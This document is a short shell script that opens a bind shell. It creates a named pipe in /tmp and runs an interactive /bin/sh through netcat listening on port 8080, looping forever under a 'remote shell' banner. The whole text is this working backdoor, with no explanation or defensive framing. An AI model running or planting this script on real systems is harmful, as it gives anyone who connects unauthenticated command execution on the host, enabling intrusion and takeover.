printf "\033c\033[43;30m\nremote shell....\n"
rm -f /tmp/f
mkfifo /tmp/f
while true ;
do
    cat /tmp/f | /bin/sh -i 2>&1 | nc -l 8080 > /tmp/f
done